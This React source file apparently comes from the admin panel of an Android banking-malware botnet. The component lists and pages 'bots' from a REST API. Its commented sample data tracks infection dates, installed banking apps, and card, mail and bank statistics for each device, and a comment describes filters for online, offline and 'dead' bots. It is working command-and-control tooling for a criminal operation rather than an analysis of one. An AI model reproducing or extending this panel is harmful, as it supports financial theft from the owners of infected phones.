import React from "react";
import BotsTbody from "./BotsTbody";
import SettingsContext from "./../../Settings";
import $ from "jquery";
import { isNullOrUndefined } from "util";

// Кнопочки листания страниц.
// TODO: Сделать норм генрацию кнопок
function GetPageItem(i, currentPage, onLoadJson) {
  if (i === currentPage) {
    return (
      <li
        style={{ width: "35px", textAlign: "center" }}
        class="page-item active"
      >
        <span class="page-link">
          {i}
          <span class="sr-only">(current)</span>
        </span>
      </li>
    );
  } else {
    return (
      <li style={{ width: "35px", textAlign: "center" }} class="page-item">
        <a class="page-link" onClick={(e) => {e.preventDefault(); onLoadJson(i);}} pageId={i} href="# ">
          {i}
        </a>
      </li>
    );
  }
}

class BotsTable extends React.Component {
  constructor(props) {
    super(props);
    this.state = {
      error: null,
      isLoaded: false,
      pages: 1,
      botslist: [],
      currentPage: 1,
    };

    this.onLoadJson = this.onLoadJson.bind(this);
  }

  componentDidMount() {
    this.onLoadJson(1);
  }

  autoUpdate() {
    if (SettingsContext.autoUpdateEnable)
      this._timer = setInterval(
        () => this.onLoadJson(this.state.currentPage),
        SettingsContext.autoUpdateDelay
      );
  }

  componentWillReceiveProps(newProps) {
    this.onLoadJson(this.state.currentPage);
  }

  componentWillUnmount() {
    this.DisableTimer();
  }

  DisableTimer() {
    if (this._timer) {
      clearInterval(this._timer);
      this._timer = null;
    }
  }
  /**'{"request":"getBots","currentPage":"1","sorting":"0101010"}'   // это с сортировкой (sorting) Пример

     0 - false    1-true

    1 - online
    2 - offline
    3 - dead
    4 - Exist App Banks
    5 - No Exist App Banks
    6 - statBank==1
    7 - statCC==1
    8 - statMail==1
    */

  async onLoadJson(currState) {
    while (isNullOrUndefined(SettingsContext.restApiUrl))
      await SettingsContext.sleep(100);
    while (SettingsContext.restApiUrl.length < 15)
      await SettingsContext.sleep(100);

    this.DisableTimer();
    
    /* let result = {
      bots: [
        {
          id: "c44ziwjexq117sazi",
          version: "7.1.2",
          tag: "weB",
          ip: "5.24.7.88",
          commands: "NULL",
          country: "tr",
          banks: "com.sdasd.asdasd:com.sdasd.sadassdsdsds",
          lastConnect: "13548",
          dateInfection: "2021-03-07 01:37",
          comment: "NULL",
          statScreen: "NULL",
          statAccessibility: "NULL",
          statProtect: "NULL",
          statBanks: "",
          statModule: "NULL",
          statAdmin: "1",
        },
        {
          id: "a94ziwjexq117sazi",
          version: "7.1.2",
          tag: "weB",
          ip: "5.24.7.88",
          commands: "NULL",
          country: "tr",
          banks: "NULL",
          lastConnect: "13548",
          dateInfection: "2021-03-07 01:37",
          comment: "NULL",
          statScreen: "NULL",
          statAccessibility: "NULL",
          statProtect: "NULL",
          statBanks: "NULL",
          statModule: "NULL",
          statAdmin: "1",
        },
        {
          id: "a84ziwjexq117sazi",
          version: "7.1.2",
          tag: "weB",
          ip: "5.24.7.88",
          commands: "NULL",
          country: "tr",
          banks: "NULL",
          lastConnect: "13548",
          dateInfection: "2021-03-07 01:37",
          comment: "NULL",
          statScreen: "NULL",
          statAccessibility: "NULL",
          statProtect: "NULL",
          statBanks: "NULL",
          statModule: "NULL",
          statAdmin: "1",
        },
        {
          id: "a74ziwjexq117sazi",
          version: "7.1.2",
          tag: "weB",
          ip: "5.24.7.88",
          commands: "NULL",
          country: "tr",
          banks: "NULL",
          lastConnect: "13548",
          dateInfection: "2021-03-07 01:37",
          comment: "NULL",
          statScreen: "NULL",
          statAccessibility: "NULL",
          statProtect: "NULL",
          statBanks: "NULL",
          statModule: "NULL",
          statAdmin: "1",
        },
        {
          id: "a64ziwjexq117sazi",
          version: "7.1.2",
          tag: "weB",
          ip: "5.24.7.88",
          commands: "NULL",
          country: "tr",
          banks: "NULL",
          lastConnect: "13548",
          dateInfection: "2021-03-07 01:37",
          comment: "NULL",
          statScreen: "NULL",
          statAccessibility: "NULL",
          statProtect: "NULL",
          statBanks: "NULL",
          statModule: "NULL",
          statAdmin: "1",
        },
        {
          id: "a54ziwjexq117sazi",
          version: "7.1.2",
          tag: "weB",
          ip: "5.24.7.88",
          commands: "NULL",
          country: "tr",
          banks: "NULL",
          lastConnect: "13548",
          dateInfection: "2021-03-07 01:37",
          comment: "NULL",
          statScreen: "NULL",
          statAccessibility: "NULL",
          statProtect: "NULL",
          statBanks: "NULL",
          statModule: "NULL",
          statAdmin: "1",
        },
        {
          id: "a44ziwjexq117sazi",
          version: "7.1.2",
          tag: "weB",
          ip: "5.24.7.88",
          commands: "NULL",
          country: "tr",
          banks: "NULL",
          lastConnect: "13548",
          dateInfection: "2021-03-07 01:37",
          comment: "NULL",
          statScreen: "NULL",
          statAccessibility: "NULL",
          statProtect: "NULL",
          statBanks: "NULL",
          statModule: "NULL",
          statAdmin: "1",
        },
        {
          id: "a34ziwjexq117sazi",
          version: "7.1.2",
          tag: "weB",
          ip: "5.24.7.88",
          commands: "NULL",
          country: "tr",
          banks: "NULL",
          lastConnect: "13548",
          dateInfection: "2021-03-07 01:37",
          comment: "NULL",
          statScreen: "NULL",
          statAccessibility: "NULL",
          statProtect: "NULL",
          statBanks: "NULL",
          statModule: "NULL",
          statAdmin: "1",
        },
        {
          id: "a24ziwjexq117sazi",
          version: "7.1.2",
          tag: "weB",
          ip: "5.24.7.88",
          commands: "NULL",
          country: "tr",
          banks: "NULL",
          lastConnect: "13548",
          dateInfection: "2021-03-07 01:37",
          comment: "NULL",
          statScreen: "NULL",
          statAccessibility: "NULL",
          statProtect: "NULL",
          statBanks: "NULL",
          statModule: "NULL",
          statAdmin: "1",
        },
        {
          id: "a14ziwjexq117sazi",
          version: "7.1.2",
          tag: "weB",
          ip: "5.24.7.88",
          commands: "NULL",
          country: "tr",
          banks: "NULL",
          lastConnect: "13548",
          dateInfection: "2021-03-07 01:37",
          comment: "NULL",
          statScreen: "NULL",
          statAccessibility: "NULL",
          statProtect: "NULL",
          statBanks: "NULL",
          statModule: "NULL",
          statAdmin: "1",
        },
      ],
      pages: "5",
      currentPage: "1",
    };
    this.setState({
      isLoaded: true,
      pages: result.pages,
      botslist: result.bots,
      currentPage: result.currentPage,
    }); */

    let request = $.ajax({
      type: "POST",
      url: SettingsContext.restApiUrl,
      data: {
        params: new Buffer(
          '{"request":"getBots","currentPage":"' +
            currState +
            '","sorting":"' +
            SettingsContext.BotsFilterMode +
            '","botsperpage":"' +
            SettingsContext.BotsPerPage +
            '","countrycode":"' +
            SettingsContext.BotByCountry +
            '","app":"' +
          SettingsContext.BotByApp +
          '","operator":"' +
          SettingsContext.BotByOperator +
            '","findbyid":"' +
            SettingsContext.FindBotByID +
            '"}'
        ).toString("base64"),
      },
    });

    request.done(
      function (msg) {
        try {
          let result = JSON.parse(msg);
          if (!isNullOrUndefined(result.error)) {
            SettingsContext.ShowToastTitle("error", "ERROR", result.error);
          } else {
            this.setState({
              isLoaded: true,
              pages: result.pages,
              botslist: result.bots,
              currentPage: result.currentPage,
            });
          }
        } catch (ErrMgs) {
          SettingsContext.ShowToastTitle(
            "error",
            "ERROR",
            "Error loading bots table. Look console for more details."
          );
          console.log("Error - " + ErrMgs);
        }
      }.bind(this)
    );

    this.autoUpdate();
  }
  /* select all */
  FaCheckBox() {
    return SettingsContext.SelectedBots.length ===
      SettingsContext.BotsOnPage.length
      ? "far fa-check-square"
      : "far fa-square";
  }
  toggleChange = () => {
    if (
      SettingsContext.SelectedBots.length === SettingsContext.BotsOnPage.length
    ) {
      SettingsContext.SelectedBots = [];
    } else {
      SettingsContext.SelectedBots = SettingsContext.BotsOnPage;
    }
    this.props.BotListForceUpdate();
  };

  render() {
    const { error, isLoaded, pages, botslist, currentPage } = this.state;
    if (error) {
      return <div>Error: {error}</div>;
    } else if (!isLoaded) {
      return <div class="loading">Loading</div>;
    } else {
      var pageElements = [];
      for (var i = 1; i <= pages; i++) {
        pageElements.push(
          GetPageItem(i, currentPage, this.onLoadJson.bind(this))
        );
      }

      var ButtonsElements = [];
      for (i = 0; pageElements.length > 0; i++) {
        ButtonsElements.push(
          pageElements.splice(0, SettingsContext.ButtonsInRow)
        );
      }

      var ButtonGroups = [];
      for (i = 0; i < ButtonsElements.length; i++) {
        ButtonGroups.push(
          <ul
            class="pagination justify-content-center"
            style={{ marginBottom: "0px" }}
          >
            {ButtonsElements[i]}
          </ul>
        );
      }

      const tdw = {
        padding: "12px",
        textAlign: "center",
        fontSize: "16px",
        width: "auto",
        minWidth: "100px",
      };

      /* const IconsClass = {
        width: "100px",
      }; */

      SettingsContext.BotsOnPage = [];

      botslist.forEach((bott) => {
        SettingsContext.BotsOnPage.push(bott.id);
      });

      return (
        <div className="row" style={{ overflowX: "auto" }}>
          <div className="col-12">
            <table class="animated fadeIn mainbottable table table-striped table-dark table-hover ">
              <thead>
                <tr style={{ backgroundColor: "#10153e" }}>
                  <th scope="col" style={{ ...tdw, width: "120px" }}>
                    <i
                      class={this.FaCheckBox()}
                      onClick={this.toggleChange.bind(this)}
                    />
                  </th>
                  <th scope="col" style={tdw}>
                    <i class="far fa-id-card"></i>
                  </th>
                  <th scope="col" style={tdw}>
                    <i class="fas fa-flag"></i>
                  </th>
                  <th scope="col" style={tdw}>
                    <i class="fas fa-tag"></i>
                  </th>
                  <th scope="col" style={tdw}>
                    <i class="far fa-stopwatch"></i>
                  </th>
                  <th scope="col" style={tdw}>
                    <i class="fas fa-mobile-alt"></i>
                  </th>
                  {/* <th scope="col" style={IconsClass}></th> */}
                  <th scope="col" style={tdw}>
                    <i class="fas fa-university"></i>
                  </th>
                  <th scope="col" style={tdw}>
                    <i class="far fa-mobile-alt"></i>
                  </th>
                  {/* <th scope="col" style={tdw}><i class="far fa-chart-network"></i></th> */}
                  <th scope="col" style={tdw}>
                    <i class="fas fa-calendar-plus"></i>
                  </th>
                  <th scope="col" style={tdw}>
                    <i class="fas fa-comment-alt"></i>
                  </th>
                  {/* <th scope="col" style={tdw}></th> */}
                </tr>
              </thead>
              <BotsTbody
                BotListForceUpdate={this.props.BotListForceUpdate}
                botList={botslist}
              />
            </table>
            <nav>
              {ButtonGroups}
              <br />
            </nav>
          </div>
        </div>
      );
    }
  }
}

export default BotsTable;
